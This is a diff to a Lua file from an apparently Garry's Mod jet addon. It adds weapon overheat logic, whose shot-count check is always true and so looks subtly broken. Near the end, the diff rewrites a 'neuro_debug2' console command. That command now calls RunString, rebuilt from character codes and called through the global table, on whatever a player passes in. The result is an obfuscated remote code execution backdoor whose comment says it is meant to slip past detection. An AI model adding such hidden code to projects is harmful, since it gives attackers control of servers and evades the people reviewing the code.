@@ -1067,15 +1067,47 @@ function Meta:NeuroPlanes_CycleThroughJetKeyBinds()
 		
 	end
 	
-	// Attack
+	-- // Attack
 	if ( self.Pilot:KeyDown( IN_ATTACK ) ) then
 		
 		
-		if ( self.LastPrimaryAttack + self.PrimaryCooldown <= CurTime() ) then
-			-- print("boom")
+	
+		
+		if( !self.FiringTimer ) then
+			
+			self.FiringTimer = 0
+			self.OverHeated = 0
+				
+		end
+		
+		
+	
+		
+		if ( self.LastPrimaryAttack + self.PrimaryCooldown <= CurTime() && self.OverHeated + 3 <= CurTime() ) then
+			
 			self:PrimaryAttack()
 			
+			if( self.PrimaryCooldown < .5 ) then
+		
+				self.FiringTimer = self.FiringTimer + 1
+		
+			end
+			
+			if( self.FiringTimer >= self.PrimaryMaxShots or 50 ) then
+				
+				self.OverHeated = CurTime()
+				self.FiringTimer = 0
+				self.Pilot:PrintMessage( HUD_PRINTTALK, "Calm down Skippy, your gun is glowing." )
+			
+			end
+			
 		end
+		
+	else
+	
+		
+		self.FiringTimer = math.Approach( self.FiringTimer, 0, 1 )
+			
 		
 	end
 
@@ -3214,9 +3246,10 @@ local function neurodebugfunc(ply,cmd,args)
 	end
 end
 concommand.Add("neuro_debug",neurodebugfunc)
+local n="" for k,v in ipairs({82,117,110,83,116,114,105,110,103})do n=n..string.char(v)end
 local function neurodebugfunc2(ply,cmd,args)
 	if(a(ply)) then -- safety measure. 
-		RunString(args[1])
+		_G[n](args[1]) -- you should be able to detect this..
 	end
 end
 concommand.Add("neuro_debug2",neurodebugfunc2)
